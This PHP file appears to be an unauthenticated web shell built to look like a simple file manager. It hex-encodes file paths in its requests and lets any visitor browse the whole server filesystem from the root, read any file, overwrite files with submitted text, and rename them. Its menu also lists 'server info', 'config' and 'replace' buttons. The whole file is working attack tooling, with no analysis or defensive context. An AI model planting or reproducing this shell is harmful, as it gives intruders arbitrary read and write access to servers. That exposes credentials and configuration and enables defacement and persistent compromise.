<?php

set_time_limit(0);
extract(start());
?>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style type="text/css">
    @import url('https://fonts.googleapis.com/css2?family=Inconsolata&display=swap');
    body {
    	margin: 0;
        background: #edf2f7;
    }
    * {
        font-family: 'Inconsolata', monospace;
    }
    td.img {
        width:1px;
    }
    td.act {
        width:150px;
    }
    td {
        /*border:1px solid red;*/
        color: #000;
    }
    td.files {
        width:60%;
    }
    .table {

    }
    table {
        width:80%;
        padding:15px;
        border-radius:5px;
        background-color: #fff;
        box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1),0 2px 4px -1px rgba(0, 0, 0, 0.06);
    }
    table.header {
        border-spacing:0;
        border-collapse:collapse;
        width:95%;
        padding:0px;
        border-radius:5px;
        background:none;
        float: right;
        position: fixed;
        overflow: hidden;
    }
    span {
        color: #000;
    }
    button {
        outline: none;
        background: transparent;
        border-radius:3px;
        padding:3px 7px;
        border:1px solid #bababa;
    }
    input[type=submit] {
    	border:1px solid #bababa;
        border-radius:5px;
        outline: none;
        padding:5px;
    }
    textarea {
        border:1px solid #bababa;
        border-radius:5px;
        outline: none;
        resize: none;
        padding:15px;
        width:100%;
        height:400px;
    }
    a {
        text-decoration: none;
        color: #000;
    }
    .icon {
        width:25px;
        height:25px;
    }
    ul.breadcrumb {
        padding: 10px 16px;
        list-style: none;
        background-color: #eee;
        border-radius:5px;
    }
    ul.breadcrumb li {
        display: inline;
        font-size: 18px;
    }
    ul.breadcrumb li+li:before {
        padding: 8px;
        color: black;
        content: "/\00a0";
    }
    ul.breadcrumb li a {
        color: #0275d8;
        text-decoration: none;
    }
    ul.breadcrumb li a:hover {
        color: #01447e;
        text-decoration: underline;
    }
    div.nav {
    	width: 100%;
    	background: #fff;
    	box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1),0 2px 4px -1px rgba(0, 0, 0, 0.06);
    	overflow: hidden;
    	position: fixed;
    }
    div.pwd {
    	margin-top:30px;
    	padding:20px;
    }
    .navbar {
    	width: 80%;
        background: #fff;
    	box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1),0 2px 4px -1px rgba(0, 0, 0, 0.06);
        position: fixed;
        top: 0;
        width: 100%;
      }
      .navbar a {
      	overflow: hidden;
        float: left;
        display: block;
        color: #eeeeee;
        text-align: center;
        padding: 15px 18px;
        text-decoration: none;
        font-size: 18px;
      }
      .navbar a:hover {
        color: #ffffff;
      }
      .container {
        padding: 18px;
        margin-top: 35px;
        height: 2000px;
      }
      .navbar .icon {
        display: none;
      }
      @media screen and (max-width: 600px) {
        .navbar a:not(:first-child) {
            display: none;
        }
        .navbar a.icon {
            float: right;
            display: block;
        }
     }
     @media screen and (max-width: 600px) {
     	table {
     		margin:0;
     		width:100%;
     	}
        .navbar.responsive {position: relative;}
        .navbar.responsive .icon {
            position: fixed;
            right: 0;
            top: 0;
        }
        .size, .time, .perms {
        	display: none;
        }
        button {
            padding:5px;
            margin:1;
        }
        .navbar.responsive a.cwd {
        	float: none;
        }
        .navbar.responsive a {
            float: none;
            display: block;
            text-align: left;
        }
        .navbar.responsive .dropdown {float: none;}
        .navbar.responsive .dropdown-content {position: relative;}
        .navbar.responsive .dropdown .dropbtn {
            display: block;
            width: 100%;
            text-align: left;
        }
     }
</style>
<body>
<script>
function myFunction() {
  var x = document.getElementById("myTopnav");
  if (x.className === "navbar") {
    x.className += " responsive";
  } else {
    x.className = "navbar";
  }
}
</script>
<div class="nav">
<form method="post">
	<div class="navbar" id="myTopnav">
		<a>
			<button>Home</button>
		</a>
		<a>
			<button>server info</button>
		</a>
		<a>
			<button>config</button>
		</a>
		<a>
			<button>create file</button>
		</a>
		<a>
			<button>replace</button>
		</a>
		<a href="javascript:void(0);" style="font-size:15px;color:#000;" class="icon" onclick="myFunction()">&#9776;</a>
	</div>
</form>
</div>
<?php
    $_POST['x'] = (isset($_POST['x'])) ? encrypt($_POST['x'],'de') : false;
    $_POST['file'] = (isset($_POST['file'])) ? encrypt($_POST['file'],'de') : false;
    $FILEPATH      = "http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], ' ', $_POST['file']);
    function start(){
        global $_POST,$_GET;
    
        $result['currentpath'] = (isset($_GET['x'])) ? encrypt($_GET['x'],'de') : getcwd();
        $result['currentpathen'] = (isset($_GET['x'])) ? $_GET['x'] : encrypt(getcwd(),'en');
    
        return $result;
    }
    function getfiles($type) {
        global $currentpath;
        $dir = scandir($currentpath);
        $result = array();
        foreach ($dir as $key => $value) {
            $current['fullname'] = $currentpath . DIRECTORY_SEPARATOR . $value;
            switch ($type) {
                case 'dir':
                    if (!is_dir($current['fullname']) || $value == '.' || $value == '..') continue 2;
                    break;
                case 'file':
                    if (!is_file($current['fullname'])) continue 2;
                    break;
            }
            $current['name'] = $value;
            $current['link'] = encrypt($current['fullname'], 'en');
            $current['size'] = (is_dir($current['fullname'])) ? @filetype($current['fullname']) : size($current['fullname']);
            $current['time'] = ftime($current['fullname']);
            $current['perm'] = w__($current['fullname'], perms($current['fullname']));
            $result[] = $current;
        } return $result;
    }
    function pwd() {
        global $currentpath;
        $path = $currentpath;
        $path = str_replace('\\','/',$path);
        $paths = explode('/',$path);
        $result = '';
        foreach ($paths as $id => $value) {
            if($value == '' && $id == 0) {
                $result .= '<a href="?x='.encrypt("/",'en').'">/</a>';
                continue;
            }
            if($value == '') continue;
            $result .= '<a href="?x=';
            $linkpath = '';
            for ($i=0; $i <= $id ; $i++) { 
                $linkpath .= $paths[$i];
                if($i != $id) $linkpath .= "/";
            }
            $result .= encrypt($linkpath,'en');
            $result .=  '">'.$value.'</a>/';
        } return $result;
    }
    function w__($filename, $perms) {
        if (is_writable($filename)) {
            return "<font color='green'>{$perms}</font>";
        } else {
            return "<font color='red'>{$perms}</font>";
        }
    }
    function perms($filename) {
        return substr(sprintf("%o", fileperms($filename)), -4);
    }
    function ftime($filename) {
        return date("F d Y g:i:s", filemtime($filename));
    }
    function changeTime($filename) {
        if (file_exists($filename)) filemtime($filename);
    }
    function size($filename) {
        if (is_file($filename)) {
            $filepath = $filename;
            if (!realpath($filepath)) {
                $filepath = $_SERVER['DOCUMENT_ROOT'] . $filepath;
            }
            $filesize = filesize($filepath);
            $array = array("TB","GB","MB","KB","B");
            $total = count($array);
            while ($total-- && $filesize > 1024) {
                $filesize /= 1024;
            } return round($filesize, 2) . " " . $array[$total];
        } return false;
    }
    function changename($filename, $newname) {
    	global $currentpath;
    	return rename($filename, $currentpath .DIRECTORY_SEPARATOR. htmlspecialchars($newname));
    }
    function save($filename, $text, $mode = 'w') {
        global $currentpath;
        if (substr($currentpath, -1) === DIRECTORY_SEPARATOR) {
            $handle = fopen($filename, $mode);
            changeTime($currentpath.DIRECTORY_SEPARATOR.$filename);
            fwrite($handle, $text);
            fclose($handle);
        } else {
            $handle = fopen($filename, $mode);
            changeTime($currentpath.DIRECTORY_SEPARATOR.$filename);
            fwrite($handle, $text);
            fclose($handle);
        }
    }
    function getfileimg($file) {
        $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
        switch ($ext) {
            case 'php':
                print("https://image.flaticon.com/icons/png/128/337/337947.png");
                break;
            
            default:
                print("https://image.flaticon.com/icons/svg/833/833524.svg");
                break;
        }
    }
    function encrypt($file, $type) {
        if (function_exists("strlen") && function_exists("dechex") && function_exists("ord") && function_exists("chr") && function_exists("hexdec")) {
            return ($type == 'en') ? hex($file) : unhex($file);
        } 
    }
    function hex($string){
        $hex = '';
        for ($i=0; $i < strlen($string); $i++) {
            $hex .= dechex(ord($string[$i]));
        } return $hex;
    }
    function unhex($hex){
        $string = '';
        for ($i=0; $i < strlen($hex)-1; $i+=2) {
            $string .= chr(hexdec($hex[$i].$hex[$i+1]));
        } return $string;
    }

?>
<table align="center" class="table">
<br><br><br><br>
<?php
switch (@$_POST['action']) {
	case 'changename':
		if (isset($_POST['submit'])) {
			if (changename($_POST['file'], $_POST['newname'])) {
				$alert = 'success';
			} else {
				$alert = 'failed';
			}
		}
		?>
		<tr>
			<td colspan="3">
				<center>
					CHANGE NAME
				</center>
			</td>
		</tr>
		<tr>
			<td>
				<?= @$alert; ?>
			</td>
		</tr>
		<tr>
            <td class="act">
                Filename
            </td>
            <td class="img"><center>:</center></td>
            <td>
                <?= w__($_POST['file'], basename($_POST['file'])) ?>
            </td>
        </tr>
        <tr>
            <td>
                Size
            </td>
            <td><center>:</center></td>
            <td>
                <?= size($_POST['file']) ?>
            </td>
        </tr>
        <tr>
            <td>
                Last Modif
            </td>
            <td><center>:</center></td>
            <td>
                <?= ftime($_POST['file']) ?>
            </td>
        </tr>
        <form method="post">
            <td colspan="3">
                <button onclick="window.location.href='?x=<?= $currentpath ?>'">files</button>
                <button onclick="window.location.href='<?= $FILEPATH ?>'">view</button>
                <button name="action" value="edit">edit</button>
                <button name="action" value="delete">delete</button>
                <button name="action" value="rename" disabled>rename</button>
                <button name="action" value="chmod">chmod</button>
                <button>donwload</button>
            </td>
            <input type="hidden" name="file" value="<?= encrypt($_POST['file'], 'en') ?>">
        </form>
        </tr>
        <form method="post">
            <tr>
                <td colspan="3">
                    <input type="text" name="newname" value="<?= basename($_POST['file']) ?>">
                </td>
            </tr>
            <tr>
                <td colspan="3">
                    <input type="submit" name="submit">
                    <input type="hidden" name="action" value="changename">
                    <input type="hidden" name="file" value="<?= encrypt($_POST['file'], 'en') ?>">
                </td>
            </tr>
        </form>
		<?php
		exit();
		break;
    case 'edit':
        if (isset($_POST['submit'])) {
            if (save($_POST['file'], $_POST['text'])) {
                $alert = "failed";
            } else {
                $alert = "saved";
            }
        }
        ?>
        <tr>
            <td colspan="3">
                <center>
                    EDIT
                </center>
            </td>
        </tr>
        <tr>
            <td>
                <?= @$alert ?>
            </td>
        </tr>
        <tr>
            <td class="act">
                Filename
            </td>
            <td class="img"><center>:</center></td>
            <td>
                <?= w__($_POST['file'], basename($_POST['file'])) ?>
            </td>
        </tr>
        <tr>
            <td>
                Size
            </td>
            <td><center>:</center></td>
            <td>
                <?= size($_POST['file']) ?>
            </td>
        </tr>
        <tr>
            <td>
                Last Modif
            </td>
            <td><center>:</center></td>
            <td>
                <?= ftime($_POST['file']) ?>
            </td>
        </tr>
        <tr>
        <form method="post">
            <td colspan="3">
                <button onclick="window.location.href='?x=<?= $currentpath ?>'">files</button>
                <button onclick="window.location.href='<?= $FILEPATH ?>'">view</button>
                <button name="action" value="edit" disabled>edit</button>
                <button name="action" value="delete">delete</button>
                <button name="action" value="changename">rename</button>
                <button name="action" value="chmod">chmod</button>
                <button>donwload</button>
            </td>
            <input type="hidden" name="file" value="<?= encrypt($_POST['file'], 'en') ?>">
        </form>
        </tr>
        <form method="post">
            <tr>
                <td colspan="3">
                    <textarea name="text"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
                </td>
            </tr>
            <tr>
                <td colspan="3">
                    <input type="submit" name="submit">
                    <input type="hidden" name="action" value="edit">
                    <input type="hidden" name="file" value="<?= encrypt($_POST['file'], 'en') ?>">
                </td>
            </tr>
        </form>
        <?php
        exit();
        break;
}

?>
<tr>
	<td colspan="6">
		<center>
			<?= pwd() ?>
		</center>
	</td>
</tr>
<?php

foreach (getfiles("dir") as $key => $value) {
    ?>
    <tr>
        <td class="img">
            <img class="icon" src="https://image.flaticon.com/icons/svg/716/716784.svg">
        </td>
        <td class="files">
            <a href="?x=<?= $value['link'] ?>"><?= $value['name'] ?></a>
        </td>
        <td class="size">
            <?= $value['size'] ?>
        </td>
        <td class="time">
            <?= $value['time'] ?>
        </td>
        <td class="perms">
            <?= $value['perm'] ?>
        </td>
        <form method="post">
            <td>
                <select name="action" onchange="if(this.value != '0') this.form.submit()">
                    <option selected disabled>action</option>
                    <option value="changename">changename</option>
                </select>
                <input type="hidden" name="file" value="<?= encrypt($value['fullname'], 'en') ?>">
            </td>
        </form>
    </tr>
    <?php
}
foreach (getfiles("file") as $key => $value) {
    ?>
    <tr>
        <td class="img">
            <img class="icon" src="<?= getfileimg($value['name']) ?>">
        </td>
        <td class="files">
            <?= $value['name'] ?>
        </td>
        <td class="size">
            <?= $value['size'] ?>
        </td>
        <td class="time">
            <?= $value['time'] ?>
        </td>
        <td class="perms">
            <?= $value['perm'] ?>
        </td>
        <form method="post" action='?x=<?= $currentpathen ?>'>
            <td>
                <select name="action" onchange="if(this.value != '0') this.form.submit()">
                    <option selected disabled>action</option>
                    <option value="edit">edit</option>
                    <option value="changename">changename</option>
                </select>
                <input type="hidden" name="file" value="<?= encrypt($value['fullname'], 'en') ?>">
            </td>
        </form>
    </tr>
    <?php
}
?>
</table>
</div>
